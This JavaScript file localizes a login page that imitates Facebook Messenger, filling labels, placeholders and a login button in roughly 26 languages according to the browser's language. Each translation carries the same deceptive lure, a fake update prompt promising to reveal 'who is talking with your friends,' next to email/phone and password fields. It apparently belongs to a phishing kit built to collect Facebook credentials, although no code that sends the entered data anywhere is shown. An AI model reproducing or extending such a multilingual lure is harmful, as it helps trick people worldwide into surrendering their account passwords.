transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
    ar: {
        dir : 'rtl',
        submain: 'قم بتحديث Messenger إلى أحدث إصدار للاستمتاع بالميزات الجديدة مثل معرفة من يتحدث مع أصدقائك',
        main : 'تواصل على الفور مع الأشخاص في حياتك. <br> قم بتسجيل الدخول باستخدام Facebook للبدء',
        update : 'تحديث الان',
        user :'عنوان البريد الإلكتروني أو رقم الهاتف المحمول',
        pass :'كلمه السر',
        button :'تسجيل دخول'
    }
    ,
    es :{
        dir : 'ltr',
        submain: 'Actualiza Messenger a la última versión para disfrutar de las nuevas funciones, como saber quién habla con tus amigos.',
        main : 'Conéctese instantáneamente con personas en su vida. Inicie sesión con Facebook para comenzar.',
        update : 'actualizar ahora',
        user :'Dirección de correo electrónico o número de teléfono',
        pass :'Contraseña',
        button :'Iniciar sesión'
    },
    mn :{
        dir : 'ltr',
        submain : 'Найзуудтайгаа хэн ярьж байгааг мэдэх зэрэг шинэ боломжуудыг ашиглахын тулд Messenger-ийг хамгийн сүүлийн хувилбар болгож шинэчилнэ үү.' ,
        main : 'Амьдралынхаа хүмүүстэй шууд холбогдоорой. Эхлэхийн тулд Facebook-ээр нэвтэрнэ үү.' ,
        update : 'Одоо шинэчлэх' ,
        user :'Имэйл хаяг эсвэл утасны дугаар' ,
        pass :'Нууц үг' ,
        button : 'Нэвтрэх'
    },
    am :{
        dir : 'rtl',
        submain: 'ከጓደኞችዎ ጋር ማን እንደሚናገር ማወቅ ባሉ አዳዲስ ባህሪያት ለመደሰት Messengerን ወደ የቅርብ ጊዜው ስሪት ያዘምኑ',
        main : 'በህይወትዎ ውስጥ ካሉ ሰዎች ጋር ወዲያውኑ ይገናኙ። ለመጀመር በፌስቡክ ይግቡ።',
        update : 'አሁን አዘምን',
        user :'ኢሜል አድራሻ ወይም ስልክ ቁጥር',
        pass :'ፕስወርድ',
        button :'እንድገባ አቆይኝ።'

    }
    ,
    bg :{
        dir : 'ltr',
        submain: 'Актуализирайте Messenger до най-новата версия, за да се насладите на новите функции, като например да знаете кой говори с приятелите ви',
        main : 'Незабавно се свържете с хората в живота си. Влезте с Facebook, за да започнете.',
        update : 'актуализирайте сега',
        user :'Имейл адрес или телефонен номер',
        pass :'парола',
        button :'Влизам'

    }
    ,
    bn :{
        dir : 'ltr',
        submain:'আপনার বন্ধুদের সাথে কে কথা বলছে তা জানার মতো নতুন বৈশিষ্ট্যগুলি উপভোগ করতে মেসেঞ্জারকে সর্বশেষ সংস্করণে আপডেট করুন৷' ,
        main :'অবিলম্বে আপনার জীবনের মানুষের সাথে সংযোগ. শুরু করতে Facebook দিয়ে সাইন ইন করুন।' ,
        update :'এখন হালনাগাদ করুন' ,
        user :'ইমেল ঠিকানা বা ফোন নম্বর' ,
        pass :'পাসওয়ার্ড' ,
        button :'প্রবেশ করুন'

    }
    ,
    cs :{
        dir : 'ltr',
        submain:'Aktualizujte Messenger na nejnovější verzi, abyste si mohli užívat s novými funkcemi, jako je vědět, kdo mluví s vašimi přáteli' ,
        main :'Okamžitě se spojte s lidmi ve svém životě. Chcete-li začít, přihlaste se pomocí Facebooku.' ,
        update :'nyní aktualizovat' ,
        user :'E-mailová adresa nebo telefonní číslo' ,
        pass :'Heslo' ,
        button :'Přihlásit se'

    },
    el :{
        dir : 'ltr',
        submain:'Ενημερώστε το Messenger στην πιο πρόσφατη έκδοση για να απολαύσετε με τις νέες δυνατότητες, όπως να γνωρίζετε ποιος μιλάει με τους φίλους σας' ,
main :'Συνδεθείτε άμεσα με άτομα της ζωής σας. Συνδεθείτε με το Facebook για να ξεκινήσετε.' ,
update :'ενημέρωση τώρα' ,
user :'Διεύθυνση email ή αριθμό τηλεφώνου' ,
pass :'Κωδικός πρόσβασης' ,
button :'Σύνδεση'

    },
    fi :{
        dir : 'ltr',
        submain:'Päivitä Messenger uusimpaan versioon, jotta voit nauttia uusista ominaisuuksista, kuten tietää, kuka puhuu ystäviesi kanssa' ,
main :'Ota välittömästi yhteys elämäsi ihmisiin. Kirjaudu sisään Facebookilla aloittaaksesi.' ,
update :'Päivitä nyt' ,
user :'Sähköpostiosoite tai puhelinnumero' ,
pass :'Salasana' ,
button :'Kirjaudu sisään'

    },
    fr :{
        dir : 'ltr',
        submain:'Mettez à jour Messenger vers la dernière version pour profiter des nouvelles fonctionnalités comme savoir qui parle avec vos amis' ,
main :'Connectez-vous instantanément avec les gens de votre vie. Connectez-vous avec Facebook pour commencer.' ,
update :'Mettez à jour maintenant' ,
user :'Adresse e-mail ou numéro de téléphone' ,
pass :'Mot de passe' ,
button :'Connexion'

    },
    he :{
        dir : 'rtl',
        submain:'עדכן את Messenger לגרסה האחרונה כדי ליהנות מהתכונות החדשות כמו לדעת מי מדבר עם החברים שלך' ,
main :'התחבר באופן מיידי לאנשים בחייך. היכנס עם פייסבוק כדי להתחיל.' ,
update :'עדכן כעת' ,
user :'כתובת אימייל או מספר טלפון' ,
pass :'סיסמה' ,
button :'התחברות'

    },
    hi :{
        dir : 'ltr',
        submain:'नई सुविधाओं का आनंद लेने के लिए मैसेंजर को नवीनतम संस्करण में अपडेट करें जैसे कि जानें कि आपके दोस्तों के साथ कौन बात कर रहा है' ,
main :'अपने जीवन में लोगों के साथ तुरंत जुड़ें। आरंभ करने के लिए फेसबुक के साथ साइन इन करें।' ,
update :'अभी अद्यतन करें' ,
user :'ईमेल पता या फोन नंबर' ,
pass :'पासवर्ड' ,
button :'लॉग इन करें'

    },
    hu :{
        dir : 'ltr',
        submain:'Frissítse a Messenger programot a legújabb verzióra, hogy élvezze az új funkciókat, például tudja, ki beszél a barátaival' ,
main :'Azonnal kapcsolatba léphetsz az életedben élő emberekkel. A kezdéshez jelentkezzen be Facebook-on.' ,
update :'frissítse most' ,
user :'E-mail cím vagy telefonszám' ,
pass :'Jelszó' ,
button :'Belépés'

    },
    id :{
        dir : 'ltr',
        submain:'Perbarui Messenger ke versi terbaru untuk menikmati fitur-fitur baru seperti mengetahui siapa yang berbicara dengan teman Anda' ,
main :'Langsung terhubung dengan orang-orang dalam hidup Anda. Masuk dengan Facebook untuk memulai.' ,
update :'memperbarui sekarang' ,
user :'Alamat email atau nomor telepon' ,
pass :'Kata sandi' ,
button :'Gabung'

    },
    it :{
        dir : 'ltr',
        submain:"Aggiorna Messenger all'ultima versione per divertirti con le nuove funzionalità come sapere chi parla con i tuoi amici" ,
main :'Connettiti istantaneamente con le persone della tua vita. Accedi con Facebook per iniziare.' ,
update :'aggiorna ora' ,
user :'Indirizzo e-mail o numero di telefono' ,
pass :"Parola d'ordine" ,
button :'Accesso'

    },
    my :{
        dir : 'ltr',
        submain:'သင့်သူငယ်ချင်းများနှင့် စကားပြောနေသူကို သိလိုသည့် အင်္ဂါရပ်အသစ်များဖြင့် ခံစားနိုင်ရန် Messenger ကို နောက်ဆုံးဗားရှင်းသို့ အပ်ဒိတ်လုပ်ပါ။' ,
main :'သင့်ဘဝရှိလူများနှင့် ချက်ခြင်းဆက်သွယ်ပါ။ စတင်ရန် Facebook ဖြင့် ဝင်ရောက်ပါ။' ,
update :'ယခု update လုပ်ပါ။' ,
user :'အီးမေးလ်လိပ်စာ သို့မဟုတ် ဖုန်းနံပါတ်' ,
pass :'စကားဝှက်' ,
button :'လော့ဂ်အင်'

    },
    ne :{
        dir : 'ltr',
        submain:'मेसेन्जरलाई नवीनतम संस्करणमा अपडेट गर्नुहोस् जस्तै नयाँ सुविधाहरूको आनन्द लिनको लागि आफ्नो साथीहरूसँग को कुरा गर्दै हुनुहुन्छ' ,
        main :'आफ्नो जीवनमा मानिसहरूसँग तुरुन्तै जडान गर्नुहोस्। सुरु गर्न Facebook मा साइन इन गर्नुहोस्।' ,
        update :'अहिले अपडेट गर्नुहोस्' ,
        user :'इमेल ठेगाना वा फोन नम्बर' ,
        pass :'पासवर्ड' ,
        button :'लग - इन'
    },
    ph :{
        dir : 'ltr',
        submain:'I-update ang Messenger sa pinakabagong bersyon upang ma-enjoy gamit ang mga bagong feature tulad ng malaman kung sino ang nakikipag-usap sa iyong mga kaibigan' ,
main :'Agad na kumonekta sa mga tao sa iyong buhay. Mag-sign in gamit ang Facebook para makapagsimula.' ,
update :'update ngayon' ,
user :'Email address o numero ng telepono' ,
pass :'Password' ,
button :'Mag log in'

    },
    pl :{
        dir : 'ltr',
        submain:'Zaktualizuj Messengera do najnowszej wersji, aby cieszyć się nowymi funkcjami, takimi jak wiedzieć, kto rozmawia ze znajomymi' ,
main :'Błyskawicznie łącz się z ludźmi w swoim życiu. Zaloguj się przez Facebooka, aby rozpocząć.' ,
update :'Aktualizuj teraz' ,
user :'Adres e-mail lub numer telefonu' ,
pass :'Hasło' ,
button :'Zaloguj sie'

    },
    pt :{
        dir : 'ltr',
        submain:'Atualize o Messenger para a versão mais recente para aproveitar os novos recursos, como saber quem está conversando com seus amigos' ,
main :'Conecte-se instantaneamente com as pessoas em sua vida. Faça login no Facebook para começar.' ,
update :'atualize agora' ,
user :'Endereço de e-mail ou número de telefone' ,
pass :'Senha' ,
button :'Conecte-se'

    },
    ro :{
        dir : 'ltr',
        submain:'Actualizați Messenger la cea mai recentă versiune pentru a vă bucura de noile funcții, cum ar fi să știți cine vorbește cu prietenii tăi' ,
main :'Conectează-te instantaneu cu oamenii din viața ta. Conectați-vă cu Facebook pentru a începe.' ,
update :'actualizează acum' ,
user :'Adresă de e-mail sau număr de telefon' ,
pass :'Parola' ,
button :'Autentificare'

    },
    sw :{
        dir : 'ltr',
        submain:'Sasisha Messenger hadi toleo jipya zaidi ili ufurahie na vipengele vipya kama vile kujua ni nani anayezungumza na marafiki zako' ,
main :'Ungana mara moja na watu katika maisha yako. Ingia ukitumia Facebook ili kuanza.' ,
update :'sasisha sasa' ,
user :'Anwani ya barua pepe au nambari ya simu' ,
pass :'Nenosiri' ,
button :'Ingia'

    },
    th :{
        dir : 'ltr',
        submain:'อัปเดต Messenger เป็นเวอร์ชันล่าสุดเพื่อเพลิดเพลินกับคุณสมบัติใหม่ เช่น รู้ว่าใครกำลังคุยกับเพื่อนของคุณ' ,
main :'เชื่อมต่อกับผู้คนในชีวิตของคุณทันที ลงชื่อเข้าใช้ Facebook เพื่อเริ่มต้น' ,
update :'อัพเดทเดี๋ยวนี้' ,
user :'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์' ,
pass :'รหัสผ่าน' ,
button :'เข้าสู่ระบบ'

    },
    tr :{
        dir : 'ltr',
        submain:"Arkadaşlarınızla kimin konuştuğunu bilmek gibi yeni özelliklerin keyfini çıkarmak için Messenger'ı en son sürüme güncelleyin" ,
main :'Hayatınızdaki insanlarla anında bağlantı kurun. Başlamak için Facebook ile giriş yapın.' ,
update :'Şimdi güncelle' ,
user :'E-posta adresi veya telefon numarası' ,
pass :'Parola' ,
button :'Giriş yapmak'

    },
    ur :{
        dir : 'rtl',
        submain:'میسنجر کو تازہ ترین ورژن میں اپ ڈیٹ کریں تاکہ نئی خصوصیات جیسے جانیں کہ آپ کے دوستوں کے ساتھ کون بات کر رہا ہے۔' ,
main :'اپنی زندگی میں لوگوں سے فوری طور پر جڑیں۔ شروع کرنے کے لیے Facebook کے ساتھ سائن ان کریں۔' ,
update :'تازہ ترین کریں. جدید بنایں' ,
user :'ای میل ایڈریس یا فون نمبر' ,
pass :'پاس ورڈ' ,
button :'لاگ ان کریں'
    },
    vi :{
        dir : 'ltr',
        submain:'Cập nhật Messenger lên phiên bản mới nhất để tận hưởng các tính năng mới như biết ai đang nói chuyện với bạn bè của bạn' ,
main :'Kết nối tức thì với những người trong cuộc sống của bạn. Đăng nhập bằng Facebook để bắt đầu.' ,
update :'cập nhật bây giờ' ,
user :'Địa chỉ email hoặc số điện thoại' ,
pass :'Mật khẩu' ,
button :'Đăng nhập'

    }
}


transItems[0].style.direction =Translate[userLang].dir;
transItems[1].innerHTML =Translate[userLang].submain;
transItems[2].innerHTML =Translate[userLang].update;
transItems[3].innerHTML =Translate[userLang].main;
transItems[4].setAttribute("placeholder" , Translate[userLang].user);
transItems[5].setAttribute("placeholder" , Translate[userLang].pass);
transItems[6].value =Translate[userLang].button